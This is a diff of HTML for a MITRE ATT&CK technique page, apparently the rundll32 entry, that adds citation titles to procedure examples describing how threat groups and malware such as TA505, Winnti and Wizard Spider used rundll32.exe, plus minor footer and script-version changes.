+                                                            <p><a href="/versions/v14/software/S1064">SVCReady</a> has used <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-98') id="scite-ref-98-a" class="scite-citeref-number" title="Schlapfer, Patrick. (2022, June 6). A New Loader Gets Ready. Retrieved December 13, 2022."data-reference="HP SVCReady Jun 2022"><sup><a href="https://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/" target="_blank" data-hasqtip="97" aria-describedby="qtip-97">[98]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1445,7 +1444,7 @@
                                                 <a href="/versions/v14/groups/G0092"> TA505 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0092">TA505</a> has leveraged <code>rundll32.exe</code> to execute malicious DLLs.<span onclick=scrollToRef('scite-99') id="scite-ref-99-a" class="scite-citeref-number" data-reference="Cybereason TA505 April 2019"><sup><a href="https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware" target="_blank" data-hasqtip="98" aria-describedby="qtip-98">[99]</a></sup></span><span onclick=scrollToRef('scite-91') id="scite-ref-91-a" class="scite-citeref-number" data-reference="Deep Instinct TA505 Apr 2019"><sup><a href="https://www.deepinstinct.com/2019/04/02/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload/" target="_blank" data-hasqtip="90" aria-describedby="qtip-90">[91]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0092">TA505</a> has leveraged <code>rundll32.exe</code> to execute malicious DLLs.<span onclick=scrollToRef('scite-99') id="scite-ref-99-a" class="scite-citeref-number" title="Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019."data-reference="Cybereason TA505 April 2019"><sup><a href="https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware" target="_blank" data-hasqtip="98" aria-describedby="qtip-98">[99]</a></sup></span><span onclick=scrollToRef('scite-91') id="scite-ref-91-a" class="scite-citeref-number" title="Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved May 28, 2019."data-reference="Deep Instinct TA505 Apr 2019"><sup><a href="https://www.deepinstinct.com/2019/04/02/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload/" target="_blank" data-hasqtip="90" aria-describedby="qtip-90">[91]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1457,7 +1456,7 @@
                                                 <a href="/versions/v14/groups/G0127"> TA551 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0127">TA551</a> has used rundll32.exe to load malicious DLLs.<span onclick=scrollToRef('scite-100') id="scite-ref-100-a" class="scite-citeref-number" data-reference="Unit 42 TA551 Jan 2021"><sup><a href="https://unit42.paloaltonetworks.com/ta551-shathak-icedid/" target="_blank" data-hasqtip="99" aria-describedby="qtip-99">[100]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0127">TA551</a> has used rundll32.exe to load malicious DLLs.<span onclick=scrollToRef('scite-100') id="scite-ref-100-a" class="scite-citeref-number" title="Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021."data-reference="Unit 42 TA551 Jan 2021"><sup><a href="https://unit42.paloaltonetworks.com/ta551-shathak-icedid/" target="_blank" data-hasqtip="99" aria-describedby="qtip-99">[100]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1469,7 +1468,7 @@
                                                 <a href="/versions/v14/software/S0452"> USBferry </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0452">USBferry</a> can execute rundll32.exe in memory to avoid detection.<span onclick=scrollToRef('scite-101') id="scite-ref-101-a" class="scite-citeref-number" data-reference="TrendMicro Tropic Trooper May 2020"><sup><a href="https://documents.trendmicro.com/assets/Tech-Brief-Tropic-Trooper-s-Back-USBferry-Attack-Targets-Air-gapped-Environments.pdf" target="_blank" data-hasqtip="100" aria-describedby="qtip-100">[101]</a></sup></span>    </p>
+                                                            <p><a href="/versions/v14/software/S0452">USBferry</a> can execute rundll32.exe in memory to avoid detection.<span onclick=scrollToRef('scite-101') id="scite-ref-101-a" class="scite-citeref-number" title="Chen, J.. (2020, May 12). Tropic Trooper’s Back: USBferry Attack Targets Air gapped Environments. Retrieved May 20, 2020."data-reference="TrendMicro Tropic Trooper May 2020"><sup><a href="https://documents.trendmicro.com/assets/Tech-Brief-Tropic-Trooper-s-Back-USBferry-Attack-Targets-Air-gapped-Environments.pdf" target="_blank" data-hasqtip="100" aria-describedby="qtip-100">[101]</a></sup></span>    </p>
 
                                             </td>
                                         </tr>
@@ -1481,7 +1480,7 @@
                                                 <a href="/versions/v14/software/S0141"> Winnti for Windows </a>
                                             </td>
                                             <td>
-                                                            <p>The <a href="/versions/v14/software/S0141">Winnti for Windows</a> installer loads a DLL using rundll32.<span onclick=scrollToRef('scite-102') id="scite-ref-102-a" class="scite-citeref-number" data-reference="Microsoft Winnti Jan 2017"><sup><a href="https://blogs.technet.microsoft.com/mmpc/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/" target="_blank" data-hasqtip="101" aria-describedby="qtip-101">[102]</a></sup></span><span onclick=scrollToRef('scite-103') id="scite-ref-103-a" class="scite-citeref-number" data-reference="Novetta Winnti April 2015"><sup><a href="https://web.archive.org/web/20150412223949/http://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf" target="_blank" data-hasqtip="102" aria-describedby="qtip-102">[103]</a></sup></span></p>
+                                                            <p>The <a href="/versions/v14/software/S0141">Winnti for Windows</a> installer loads a DLL using rundll32.<span onclick=scrollToRef('scite-102') id="scite-ref-102-a" class="scite-citeref-number" title="Cap, P., et al. (2017, January 25). Detecting threat actors in recent German industrial attacks with Windows Defender ATP. Retrieved February 8, 2017."data-reference="Microsoft Winnti Jan 2017"><sup><a href="https://blogs.technet.microsoft.com/mmpc/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/" target="_blank" data-hasqtip="101" aria-describedby="qtip-101">[102]</a></sup></span><span onclick=scrollToRef('scite-103') id="scite-ref-103-a" class="scite-citeref-number" title="Novetta Threat Research Group. (2015, April 7). Winnti Analysis. Retrieved February 8, 2017."data-reference="Novetta Winnti April 2015"><sup><a href="https://web.archive.org/web/20150412223949/http://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf" target="_blank" data-hasqtip="102" aria-describedby="qtip-102">[103]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1493,7 +1492,7 @@
                                                 <a href="/versions/v14/groups/G0102"> Wizard Spider </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0102">Wizard Spider</a> has utilized <code>rundll32.exe</code> to deploy ransomware commands with the use of WebDAV.<span onclick=scrollToRef('scite-104') id="scite-ref-104-a" class="scite-citeref-number" data-reference="Mandiant FIN12 Oct 2021"><sup><a href="https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf" target="_blank" data-hasqtip="103" aria-describedby="qtip-103">[104]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0102">Wizard Spider</a> has utilized <code>rundll32.exe</code> to deploy ransomware commands with the use of WebDAV.<span onclick=scrollToRef('scite-104') id="scite-ref-104-a" class="scite-citeref-number" title="Shilko, J., et al. (2021, October 7). FIN12: The Prolific Ransomware Intrusion Threat Actor That Has Aggressively Pursued Healthcare Targets. Retrieved June 15, 2023."data-reference="Mandiant FIN12 Oct 2021"><sup><a href="https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf" target="_blank" data-hasqtip="103" aria-describedby="qtip-103">[104]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1505,7 +1504,7 @@
                                                 <a href="/versions/v14/software/S0412"> ZxShell </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0412">ZxShell</a> has used rundll32.exe to execute other DLLs and named pipes.<span onclick=scrollToRef('scite-105') id="scite-ref-105-a" class="scite-citeref-number" data-reference="Talos ZxShell Oct 2014"><sup><a href="https://blogs.cisco.com/security/talos/opening-zxshell" target="_blank" data-hasqtip="104" aria-describedby="qtip-104">[105]</a></sup></span> </p>
+                                                            <p><a href="/versions/v14/software/S0412">ZxShell</a> has used rundll32.exe to execute other DLLs and named pipes.<span onclick=scrollToRef('scite-105') id="scite-ref-105-a" class="scite-citeref-number" title="Allievi, A., et al. (2014, October 28). Threat Spotlight: Group 72, Opening the ZxShell. Retrieved September 24, 2019."data-reference="Talos ZxShell Oct 2014"><sup><a href="https://blogs.cisco.com/security/talos/opening-zxshell" target="_blank" data-hasqtip="104" aria-describedby="qtip-104">[105]</a></sup></span> </p>
 
                                             </td>
                                         </tr>
@@ -2972,8 +2971,7 @@
                                 <div class="footer-float-right-responsive-brand">
                                     <div class="mb-1">
                                         <a href="https://twitter.com/MITREattack" class="btn btn-primary w-100">
-                                            <!-- <i class="fa fa-twitter"></i> -->
-                                            <img src="/versions/v14/theme/images/twitter.png" class="mr-1 twitter-icon">
+                                            <i class="fa-brands fa-twitter fa-lg"></i>
                                             <b>@MITREattack</b>
                                         </a>
                                     </div>
@@ -3000,8 +2998,8 @@
     <script src="/versions/v14/theme/scripts/popper.min.js"></script>
     <script src="/versions/v14/theme/scripts/bootstrap-select.min.js"></script>
     <script src="/versions/v14/theme/scripts/bootstrap.bundle.min.js"></script>
-    <script src="/versions/v14/theme/scripts/site.js?3056"></script>
-    <script src="/versions/v14/theme/scripts/settings.js?8589"></script>
+    <script src="/versions/v14/theme/scripts/site.js?6713"></script>
+    <script src="/versions/v14/theme/scripts/settings.js?8328"></script>
     <script src="/versions/v14/theme/scripts/search_bundle.js"></script>
 
 <!--SCRIPTS-->
